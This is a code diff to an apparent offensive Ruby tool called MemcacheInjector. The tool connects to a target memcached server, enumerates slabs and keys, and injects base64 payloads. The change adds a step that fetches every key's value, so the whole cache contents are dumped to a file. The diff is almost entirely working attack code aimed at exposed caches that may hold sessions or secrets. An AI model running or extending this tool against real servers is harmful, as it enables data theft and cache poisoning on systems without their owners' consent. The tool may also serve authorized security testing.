@@ -23,7 +23,7 @@ class MemcacheInjector
         loop do
           data << @socket.recv(1028)
 
-          raise Error.new if data.include?(ERROR)
+          raise Error.new("Got #{data}") if data.include?(ERROR)
           break if data.include?(EOF)
         end
       end
@@ -69,7 +69,7 @@ class MemcacheInjector
     end
   end
 
-  attr_reader :output, :slabs, :keys
+  attr_reader :slabs, :kv, :output
 
   def initialize(options)
     @socket      = SocketWrapper.new(TCPSocket.new(options[:target], options[:port] || 11211))
@@ -80,7 +80,7 @@ class MemcacheInjector
     @output      = options[:output] && File.new(options[:output], 'w+') || STDOUT
     @conns       = Array.new
     @slabs       = Hash.new
-    @keys        = Array.new
+    @kv          = Hash.new
   end
 
   def get_general_stats
@@ -115,15 +115,25 @@ class MemcacheInjector
     keys = []
 
     items.each do |item|
-      keys << item.split('ITEM ')[0].split(' ')[0]
+      key = item.split('ITEM ')[0].split(' ')[0]
+
+      if key
+        keys << key
+        @kv[key] = nil
+      end
     end
 
-    @keys << keys
     keys
   end
 
+  def dump_value_from_key(key)
+    val = @socket.send("get #{key}")[1]
+    @kv[key] = val
+    val
+  end
+
   def write_slabs_to_output
-    @output.write @keys.join("\r\n")
+    @output.write @kv.keys.join("\r\n")
   end
 
   private
@@ -187,7 +197,7 @@ subcommands = {
     opts.on("-t", "--target HOSTNAME", String, "Target hostname") do |hostname|
       options[:target] = hostname
     end
-    opts.on("-p", "--payload STRING", String, "Payload") do |str|
+    opts.on("-p", "--payload BASE64", String, "Payload") do |str|
       options[:payload] = str
     end
     opts.on("-k", "--key [REGEX]", Regexp, "Regex to filter keys by") do |regex|
@@ -230,6 +240,12 @@ when "dump"
     print "Starting dump of keys in slab ##{i}..."
     dump = client.dump_keys_from_slab(i)
     puts " Got #{dump.count} key(s)."
+  end
+
+  client.kv.keys.each do |key|
+    print "Getting value for key #{key}..."
+    dump = client.dump_value_from_key(key)
+    puts " Got #{dump.size} byte(s)."
   end
 
   client.write_slabs_to_output
